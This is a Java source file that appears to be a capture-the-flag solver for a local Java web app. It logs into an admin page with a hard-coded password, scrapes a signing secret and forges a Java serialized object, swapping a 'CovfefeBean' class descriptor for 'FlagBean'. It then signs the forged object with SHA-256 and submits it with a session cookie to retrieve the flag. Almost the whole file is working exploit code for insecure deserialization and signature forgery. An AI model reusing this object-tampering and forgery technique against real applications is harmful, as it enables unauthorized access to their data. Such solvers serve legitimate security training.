package solver;

import com.google.common.hash.Hashing;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.ArrayList;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.io.IOException;
import java.util.Base64;
import java.math.BigInteger;
import java.util.stream.*;

import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.cookie.Cookie;
import org.apache.http.client.CookieStore;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.impl.cookie.BasicClientCookie;
import org.apache.http.util.EntityUtils;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.protocol.HttpClientContext;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;
import org.jsoup.nodes.Element;
import org.jsoup.Jsoup;

public class BeanSolve {
  public static String SERVER_IP =  "http://localhost:8888";
  public static String getSign() throws UnsupportedEncodingException, IOException {
    CloseableHttpClient httpclient = HttpClients.createDefault();
    HttpPost httppost = new HttpPost(BeanSolve.SERVER_IP + "/admin.jsp");
    String pass = "Pas$ion";
    PasswordMatch passmatch = new PasswordMatch(pass);
    String altpass = passmatch.generate(pass);
    List<NameValuePair> params = new ArrayList<NameValuePair>(1);
    params.add(new BasicNameValuePair("password", altpass));
    httppost.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));

    HttpResponse response = httpclient.execute(httppost);
    HttpEntity entity = response.getEntity();

    if (entity != null) {
      InputStream instream = entity.getContent();
      try {
        java.util.Scanner s = new java.util.Scanner(instream).useDelimiter("\\A");
        Document doc = Jsoup.parse(s.hasNext() ? s.next() : "");
        Elements password = doc.select("div.col-sm-auto");
        String sign = password.first().html();
        return sign;
      } finally {
        instream.close();
      }
    }
    return null;
  }

  public static String[] getHash() throws UnsupportedEncodingException, IOException {
    CloseableHttpClient httpclient = HttpClients.createDefault();
    HttpGet httpget = new HttpGet(BeanSolve.SERVER_IP + "/breed.jsp");

    HttpResponse response = httpclient.execute(httpget);
    HttpEntity entity = response.getEntity();
    if (entity != null) {
      InputStream instream = entity.getContent();
      try {
        java.util.Scanner s = new java.util.Scanner(instream).useDelimiter("\\A");
        Document doc = Jsoup.parse(s.hasNext() ? s.next() : "");
        Elements options = doc.select("select[name=parent1]").select("option");
        String[] res = {options.attr("value"), options.first().html()};
        return res;
      } finally {
        instream.close();
      }
    }
    return null;
  }

  public static void submitBean(String sessionId, String parentHash, String name) throws UnsupportedEncodingException, IOException {
    CloseableHttpClient client = HttpClientBuilder.create().build();

    final HttpPost post = new HttpPost(BeanSolve.SERVER_IP + "/roaster.jsp");

    List<NameValuePair> params = new ArrayList<NameValuePair>(1);
    params.add(new BasicNameValuePair("parent1", parentHash));
    params.add(new BasicNameValuePair("parent2", parentHash));
    params.add(new BasicNameValuePair("bean-name", name));
    params.add(new BasicNameValuePair("bean-desc", ""));
    post.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));
    post.setHeader("Cookie", "JSESSIONID=" + sessionId);

    CloseableHttpResponse resp = client.execute(post);
    HttpEntity entity = resp.getEntity();
  }

  public static String getFlag(String sessionId, String name) throws UnsupportedEncodingException, IOException {
    CloseableHttpClient client = HttpClientBuilder.create().build();

    final HttpGet get = new HttpGet(BeanSolve.SERVER_IP + "");
    get.setHeader("Cookie", "JSESSIONID=" + sessionId);

    CloseableHttpResponse resp = client.execute(get);
    HttpEntity entity = resp.getEntity();
    if (entity != null) {
      InputStream instream = entity.getContent();
      try {
        java.util.Scanner s = new java.util.Scanner(instream).useDelimiter("\\A");
        Document doc = Jsoup.parse(s.hasNext() ? s.next() : "");
        Elements options = doc.select("tbody").select("tr");
        for (Element option : options) {
          if (option.child(0).html().equals(name)) {
            return option.child(1).html();
          }
        }
      } finally {
        instream.close();
      }
    }
    return null;
  }

  public static String getCookie() throws IOException {
    CloseableHttpClient client = null;
    CookieStore cookieStore = new BasicCookieStore();
    HttpClientBuilder builder = HttpClientBuilder.create().setDefaultCookieStore(cookieStore);
    client = builder.build();

    final HttpGet get = new HttpGet(BeanSolve.SERVER_IP + "");
    CloseableHttpResponse resp = client.execute(get);

    List<Cookie> cookies = cookieStore.getCookies();
    return cookies.get(0).getValue();
  }

  public static char[] bytesToHex(byte[] bytes) {
    char[] hexArray = "0123456789ABCDEF".toCharArray();
    char[] hexChars = new char[bytes.length * 2];
    for ( int j = 0; j < bytes.length; j++ ) {
      int v = bytes[j] & 0xFF;
      hexChars[j * 2] = hexArray[v >>> 4];
      hexChars[j * 2 + 1] = hexArray[v & 0x0F];
    }
    return hexChars;
  }

  public static String hexString(int input) {
    String result = Integer.toHexString(input);
    if (result.length() == 1) {
      result = "0" + result;
    }
    return result;
  }

  public static String hexString(String arg) {
    String result = String.format("%040x", new BigInteger(1, arg.getBytes()));
    for (int i = 0; i < result.length(); i++){
      char c = result.charAt(i);
      if (c != '0') {
        return result.substring(i);
      }
    }
    return null;
  }

  public static byte[] hexStringToByteArray(String s) {
    int len = s.length();
    byte[] data = new byte[len / 2];
    for (int i = 0; i < len; i += 2) {
        data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                             + Character.digit(s.charAt(i+1), 16));
    }
    return data;
  }

  public static String buildFlag(String hash, String name) {
    String flagHash = null;
    final byte[] hashbytes = Base64.getDecoder().decode(hash);
    ArrayList<String> originalhash = new ArrayList<String>();
    ArrayList<String> hashhexfmt = new ArrayList<String>();
    int current = 0;
    for (int i = 0; i < 6; i++) { // 0x72 TC_CLASSDESC
      hashhexfmt.add(String.format("%02X", hashbytes[i]));
    }

    String input_classname = "coffee.CovfefeBean";

    current = 6;

    // Please use cofveve bean
    hashhexfmt.add("00"); // Length of flagbean
    hashhexfmt.add("0f");

    String flagname = "coffee.FlagBean";
    char[] hexflagname = hexString(flagname).toCharArray();
    for (int i = 0; i < hexflagname.length; i += 2) {
      String s = new StringBuilder().append(hexflagname[i]).append(hexflagname[i+1]).toString();
      hashhexfmt.add(s);
    }

    current += 2;
    current += input_classname.length();

    int serialversionuid_length = 8;

    hashhexfmt.add("00"); // Because the serial version is the same
    hashhexfmt.add("00");
    hashhexfmt.add("00");
    hashhexfmt.add("00");
    hashhexfmt.add("00");
    hashhexfmt.add("00");
    hashhexfmt.add("00");
    hashhexfmt.add("01");

    current += serialversionuid_length;
    String asname = "Covfefe"; // -2 for pee pee - 2 for length of field
    for (int i = current; i < hashbytes.length - asname.length() - 2 - 2; i++) {
      hashhexfmt.add(String.format("%02X", hashbytes[i])); // Uids are identical
    }

    String namefieldvalue = "Flag";
    hashhexfmt.add("00"); // Length of flagbean
    hashhexfmt.add("04");
    hexflagname = hexString(namefieldvalue).toCharArray();
    for (int i = 0; i < hexflagname.length; i += 2) {
      String s = new StringBuilder().append(hexflagname[i]).append(hexflagname[i+1]).toString();
      hashhexfmt.add(s);
    }

    hashhexfmt.add("70"); // pee pee
    hashhexfmt.add("70");
    String full = "";
    for (String s : hashhexfmt) {
      full += s;

    }
    byte[] byteflag = hexStringToByteArray(full);
    return new String(Base64.getEncoder().encode(byteflag));
  }

  public static void main(String[] args) throws UnsupportedEncodingException, IOException {

    String sessionId = getCookie();
    String sign = getSign();

    String[] hashAndName = getHash();
    String target = hashAndName[0];
    String name = hashAndName[1];
    String basehash = target.split("-")[0];

    String flagpayload = buildFlag(basehash, name);
    final String hashed = Hashing.sha256()
          .hashString(flagpayload + sign, StandardCharsets.UTF_8)
          .toString();
    String result = flagpayload + "-" + hashed;
    submitBean(sessionId, result, "test");
    System.out.println(getFlag(sessionId, "test"));
  }
}
